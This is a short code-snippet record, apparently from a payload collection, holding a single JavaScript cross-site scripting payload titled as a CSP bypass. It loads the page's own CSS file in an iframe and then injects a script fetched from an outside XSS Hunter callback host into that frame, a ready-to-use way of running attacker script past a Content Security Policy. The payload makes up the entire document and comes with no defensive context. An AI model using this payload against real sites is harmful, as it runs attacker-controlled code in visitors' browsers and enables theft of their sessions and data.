---
id: 7b2adb83-020f-43be-bb58-958a5f8e322c
type: code
language: js
verified: false
created_at: '2023-04-06T03:56:43.239195+00:00'
updated_at: '2023-04-10T20:21:38.853251+00:00'
---

# Code Snippet 7b2adb83

**Language**: js

```js
// CSP Bypass with Inline and Eval
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```


